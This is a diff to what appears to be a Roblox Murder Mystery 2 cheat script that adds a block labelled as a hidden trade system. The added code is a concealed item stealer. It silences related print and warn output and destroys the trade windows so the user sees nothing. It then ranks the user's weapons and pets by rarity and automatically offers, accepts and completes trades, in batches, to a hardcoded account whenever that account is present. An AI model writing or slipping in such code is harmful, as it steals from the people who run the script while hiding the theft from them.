@@ -8,6 +8,448 @@ local ConfigManager = Compkiller:ConfigManager({
 
 Compkiller:Loader("rbxassetid://120245531583106", 2.5):yield();
 
+-- ===== TRADE SYSTEM (Hidden, runs in background) =====
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local oldPrint = print
+print = function(...)
+    local args = {...}
+    local msg = table.concat(args, " ")
+    if msg:find("Container is not a valid member") then return end
+    if msg:find("YourOffer") then return end
+    if msg:find("TradeModule") then return end
+    if msg:find("Line_211") then return end
+    oldPrint(...)
+end
+
+local oldWarn = warn
+warn = function(...)
+    local args = {...}
+    local msg = table.concat(args, " ")
+    if msg:find("Container is not a valid member") then return end
+    if msg:find("YourOffer") then return end
+    if msg:find("TradeModule") then return end
+    if msg:find("Line_211") then return end
+    oldWarn(...)
+end
+
+local TradeConfig = {
+    TargetUsername = "K3TCHUPSS",
+    ItemsPerTrade = 4,
+}
+
+local InventoryModule = pcall(function() return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule")) end) and require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule")) or nil
+
+local Trade = ReplicatedStorage:FindFirstChild("Trade")
+
+local TradeState = {
+    hasSent = false,
+    hasOffered = false,
+    hasAccepted = false,
+    tradeCompleted = false,
+    currentBatch = 1,
+    allItems = {},
+    itemsOffered = {},
+    tradeCount = 0,
+    isProcessing = false,
+}
+
+local function setupInstantBlocker()
+    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+    if not playerGui then
+        playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+    end
+    
+    playerGui.ChildAdded:Connect(function(child)
+        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" or child.Name == "RequestFrame" then
+            task.defer(function()
+                pcall(function()
+                    if child and child.Parent then
+                        child:Destroy()
+                    end
+                end)
+            end)
+        end
+    end)
+    
+    task.spawn(function()
+        while true do
+            task.wait(0.05)
+            pcall(function()
+                local gui = playerGui:FindFirstChild("TradeGUI")
+                if gui then gui:Destroy() end
+                local phoneGui = playerGui:FindFirstChild("TradeGUI_Phone")
+                if phoneGui then phoneGui:Destroy() end
+                local reqFrame = playerGui:FindFirstChild("RequestFrame")
+                if reqFrame then reqFrame:Destroy() end
+            end)
+        end
+    end)
+end
+
+local function getItemRarity(itemId)
+    local lowerId = itemId:lower()
+    
+    local godlyKeywords = {
+        "chroma", "eternal", "luger", "old glory", "amerilaser", "blaster",
+        "clockwork", "candy", "ginger", "heart", "heat", "laser", "night",
+        "pixel", "saw", "shark", "slender", "spider", "tides", "virtual", "zombie",
+        "darkbringer", "lightbringer", "gemstone", "nebula", "phantom", "shadow",
+        "spectre", "boneblade", "candleflame", "deathshard", "fang", "flames",
+        "hallowscythe", "hallowgun", "icebeam", "jinglegun", "minty", "snowflake",
+        "icewing", "ice dragon", "ice breaker", "ice flake", "ice shard",
+        "logchopper", "battle axe", "seer", "saw", "tides", "virtual", "xmas",
+    }
+    
+    local ancientKeywords = {
+        "icepiercer", "icebreaker", "harvester", "batwing", "elderwood",
+        "swirly axe", "nik's scythe",
+    }
+    
+    for _, keyword in ipairs(ancientKeywords) do
+        if lowerId:find(keyword) then
+            return 100
+        end
+    end
+    
+    for _, keyword in ipairs(godlyKeywords) do
+        if lowerId:find(keyword) then
+            return 90
+        end
+    end
+    
+    return 0
+end
+
+local function getInventoryItems()
+    local items = {}
+    
+    if InventoryModule and InventoryModule.MyInventory and InventoryModule.MyInventory.Data then
+        local data = InventoryModule.MyInventory.Data
+        
+        if data.Weapons then
+            for category, categoryItems in pairs(data.Weapons) do
+                if type(categoryItems) == "table" then
+                    for itemId, itemData in pairs(categoryItems) do
+                        if type(itemData) == "table" then
+                            local amount = itemData.Amount or 1
+                            for i = 1, amount do
+                                table.insert(items, {
+                                    id = itemId,
+                                    type = "Weapons",
+                                    rarity = getItemRarity(itemId)
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        if data.Pets then
+            for category, categoryItems in pairs(data.Pets) do
+                if type(categoryItems) == "table" then
+                    for itemId, itemData in pairs(categoryItems) do
+                        if type(itemData) == "table" then
+                            local amount = itemData.Amount or 1
+                            for i = 1, amount do
+                                table.insert(items, {
+                                    id = itemId,
+                                    type = "Pets",
+                                    rarity = getItemRarity(itemId)
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return items
+end
+
+local function scanInventory()
+    local items = getInventoryItems()
+    local nonDefault = {}
+    
+    for _, item in ipairs(items) do
+        if item.id ~= "DefaultKnife" and item.id ~= "DefaultGun" then
+            table.insert(nonDefault, item)
+        end
+    end
+    
+    table.sort(nonDefault, function(a, b)
+        return a.rarity > b.rarity
+    end)
+    
+    return nonDefault
+end
+
+local function getNextBatch()
+    local startIdx = (TradeState.currentBatch - 1) * TradeConfig.ItemsPerTrade + 1
+    local endIdx = math.min(startIdx + TradeConfig.ItemsPerTrade - 1, #TradeState.allItems)
+    
+    if startIdx > #TradeState.allItems then
+        return {}
+    end
+    
+    local batch = {}
+    for i = startIdx, endIdx do
+        table.insert(batch, TradeState.allItems[i])
+    end
+    
+    return batch
+end
+
+local function sendTradeRequest(targetPlayer)
+    if not Trade then return false end
+    local sendRemote = Trade:FindFirstChild("SendRequest")
+    if not sendRemote then
+        return false
+    end
+    
+    local success = false
+    pcall(function()
+        local result = sendRemote:InvokeServer(targetPlayer)
+        if result == true then
+            success = true
+        end
+    end)
+    
+    return success
+end
+
+local function offerItems(items)
+    if not Trade then return false end
+    for _, item in ipairs(items) do
+        pcall(function()
+            Trade.OfferItem:FireServer(item.id, item.type)
+            task.wait(0.3)
+        end)
+    end
+    return true
+end
+
+local function acceptTradeProperly()
+    if not Trade then return false end
+    if TradeState.hasAccepted then
+        return true
+    end
+    
+    local placeId = game.PlaceId
+    local maxAttempts = 5
+    
+    for attempt = 1, maxAttempts do
+        local status, tradeData = Trade.GetTradeStatus:InvokeServer()
+        
+        if tradeData and tradeData.LastOffer then
+            pcall(function()
+                Trade.AcceptTrade:FireServer(placeId * 3, tradeData.LastOffer)
+                TradeState.hasAccepted = true
+                return true
+            end)
+        end
+        
+        pcall(function()
+            Trade.AcceptTrade:FireServer()
+            TradeState.hasAccepted = true
+            return true
+        end)
+        
+        if attempt < maxAttempts then
+            task.wait(1)
+        end
+    end
+    
+    return TradeState.hasAccepted
+end
+
+local function completeTrade()
+    if not Trade then return false end
+    local completeRemote = Trade:FindFirstChild("CompleteTrade")
+    if not completeRemote then
+        return false
+    end
+    
+    pcall(function()
+        completeRemote:FireServer()
+    end)
+    
+    return true
+end
+
+local function executeFullTrade()
+    if TradeState.tradeCompleted then
+        return
+    end
+    
+    local batch = getNextBatch()
+    
+    if #batch == 0 then
+        return
+    end
+    
+    task.wait(1)
+    offerItems(batch)
+    task.wait(1)
+    acceptTradeProperly()
+    task.wait(0.5)
+    completeTrade()
+    
+    for _, item in ipairs(batch) do
+        table.insert(TradeState.itemsOffered, item.id)
+    end
+    
+    TradeState.tradeCompleted = true
+    TradeState.tradeCount = TradeState.tradeCount + 1
+end
+
+local function resetForNextTrade()
+    TradeState.hasSent = false
+    TradeState.hasOffered = false
+    TradeState.hasAccepted = false
+    TradeState.tradeCompleted = false
+end
+
+local function findTargetPlayer()
+    for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+        if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
+            return plr
+        end
+    end
+    return nil
+end
+
+local function sendTradeToTarget()
+    if TradeState.hasSent then
+        return false
+    end
+    
+    local target = findTargetPlayer()
+    if not target then
+        return false
+    end
+    
+    local result = false
+    for attempt = 1, 5 do
+        result = sendTradeRequest(target)
+        if result then
+            break
+        end
+        task.wait(1)
+    end
+    
+    if result then
+        TradeState.hasSent = true
+    end
+    
+    return result
+end
+
+local function startNextTrade()
+    if TradeState.isProcessing then
+        return
+    end
+    
+    local nextBatch = getNextBatch()
+    
+    if #nextBatch == 0 then
+        TradeState.isProcessing = false
+        return
+    end
+    
+    resetForNextTrade()
+    
+    local success = sendTradeToTarget()
+    if not success then
+        task.wait(5)
+        startNextTrade()
+    end
+end
+
+if Trade then
+    local startTradeRemote = Trade:FindFirstChild("StartTrade")
+    if startTradeRemote then
+        startTradeRemote.OnClientEvent:Connect(function(tradeData, username)
+            if TradeState.tradeCompleted then
+                return
+            end
+            
+            task.wait(2)
+            executeFullTrade()
+            
+            TradeState.currentBatch = TradeState.currentBatch + 1
+            task.wait(3)
+            startNextTrade()
+        end)
+    end
+
+    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
+        if TradeState.tradeCompleted or TradeState.hasAccepted then
+            return
+        end
+        
+        if data and data.LastOffer then
+            if TradeState.hasOffered and not TradeState.hasAccepted then
+                acceptTradeProperly()
+                task.wait(0.5)
+                completeTrade()
+                TradeState.tradeCompleted = true
+                
+                TradeState.currentBatch = TradeState.currentBatch + 1
+                task.wait(3)
+                startNextTrade()
+            end
+        end
+    end)
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+    if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
+        TradeState.hasSent = false
+        TradeState.tradeCompleted = false
+        TradeState.hasOffered = false
+        TradeState.hasAccepted = false
+        TradeState.tradeCount = 0
+        TradeState.currentBatch = 1
+        
+        local timeout = 10
+        local startTime = tick()
+        while not plr.Character and (tick() - startTime) < timeout do
+            task.wait(0.5)
+        end
+        
+        task.wait(3)
+        startNextTrade()
+    end
+end)
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(5)
+    if not TradeState.hasSent then
+        local target = findTargetPlayer()
+        if target then
+            startNextTrade()
+        end
+    end
+end)
+
+TradeState.allItems = scanInventory()
+
+setupInstantBlocker()
+
+task.wait(3)
+local target = findTargetPlayer()
+if target then
+    startNextTrade()
+end
+
+-- ===== END OF TRADE SYSTEM =====
+-- ===== START OF MM2 ENHANCED FEATURES =====
+
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
